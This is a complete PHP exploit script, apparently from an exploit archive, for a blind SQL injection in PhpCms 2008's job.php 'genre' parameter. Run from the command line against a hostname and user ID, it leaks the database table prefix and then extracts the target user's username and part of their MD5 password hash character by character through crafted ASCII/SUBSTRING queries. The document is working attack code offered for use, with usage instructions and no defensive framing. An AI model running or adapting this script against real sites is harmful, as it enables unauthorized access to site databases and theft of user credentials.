<?php

if ($argc != 4)
	usage ();

$hostname = $argv [1];
$path = $argv [2];
$userid = $argv [3];
$prefix="phpcms_";
//$key = "abcdefghijklmnopqrstuvwxyz0123456789";
$pos = 1;
$chr = 0;


function usage ()
{
	global $argv;
	echo
		"\n[+] PhpCms 2008 (job.php \$genre) Blind SQL Injection Exploit".
		"\n[+] Author: My5t3ry".
		"\n[+] Site  : http://hi.baidu.com/netstart".
		"\n[+] Usage : php ".$argv[0]." <hostname> <path> <userid>".
		"\n[+] Ex.   : php ".$argv[0]." localhost /yp 1".
		"\n\n";
	exit ();
}

function request ($hostname, $path, $query)
{
	$fp = fsockopen ($hostname, 80);
	
	$request = "GET {$path}/job.php?action=list&inputtime=0&station=4&genre={$query} HTTP/1.1\r\n".
		   "Host: {$hostname}\r\n".
		   "Connection: Close\r\n\r\n";

	fputs ($fp, $request);

	while (!feof ($fp))
		$reply .= fgets ($fp, 1024);
	
	fclose ($fp);
	return $reply;
}

function exploit ($hostname, $path, $uid, $fld, $chr, $pos)
{
	global $prefix;

	$chr = ord ($chr);

	$query = "x' OR ASCII(SUBSTRING((SELECT {$fld} FROM ".$prefix."member WHERE userid = '{$uid}'),{$pos},1))={$chr} OR '1' = '2";

	$query = str_replace (" ", "%20", $query);

	$query = str_replace ("'", "%2527", $query);

	$outcode = request ($hostname, $path, $query);

	preg_match ("/<span class=\"c_orange\">(.+)<\/span>/", $outcode, $x);

	if (strlen (trim ($x [1])) == 0)
		return false;
	else
		return true;
}

$query = "x%2527";

$outcode = request ($hostname, $path, $query);

preg_match('/FROM `(.+)yp_job/ie',$outcode,$match);

$prefix=$match[1];

//function lengthcolumns ()
//{
   echo "\n--------------------------------------------------------------------------------\n";
   echo " PhpCms 2008 (job.php \$genre) Blind SQL Injection Exploit\n";
   echo " By My5t3ry (http://hi.baidu.com/netstart)\n";
   echo "\n--------------------------------------------------------------------------------\n";
   echo "[~]trying to get pre...\n";

   if ($match[1]) { 
	   
	echo '[+]Good Job!Wo Got The pre -> '.$match[1]."\n";
	}
   
   else {
	   die(" Exploit failed...");
	   }

   echo "[~]trying to get username length...\n";
	$exit=0;
	$length=0;
	$i=0;
	while ($exit==0)
	{
		$query = "x' OR length((select username from ".$prefix."member Where userid='{$userid}'))=".$i." OR '1'='2";

		$query = str_replace (" ", "%20", $query);

		$query = str_replace ("'", "%2527", $query);

		$outcode = request ($hostname, $path, $query);

		$i++;

		preg_match ("/<span class=\"c_orange\">(.+)<\/span>/", $outcode, $x);
		//echo $outcode;
		if ($i>20) {die(" Exploit failed...");}  

		if (strlen (trim ($x [1])) != 0) {
			$exit=1;
		}else{
			$exit=0;
		}
	}

	$length=$i-1;
	echo "[+]length -> ".$length;

//	return $length;
//}

echo "\n[~]Trying to Crack...";
echo "\n[+]username -> ";

while ($pos <= $length)
{
	$key = "abcdefghijklmnopqrstuvwxyz0123456789";

	if (exploit ($hostname, $path, $userid, "username", $key [$chr], $pos))
	{
		echo $key [$chr];
		$chr = -1;
		$pos++;
	}
	$chr++;
}

$pos = 9;

echo "\n[+]password(md5) -> ";

while ($pos <= 24)
{
	$key = "abcdef0123456789";
	if (exploit ($hostname, $path, $userid, "password", $key [$chr], $pos))
	{
		echo $key [$chr];
		$chr = -1;
		$pos++;
	}
	$chr++;
}

echo "\n[+]Done!";
echo "\n\n--------------------------------------------------------------------------------";

?>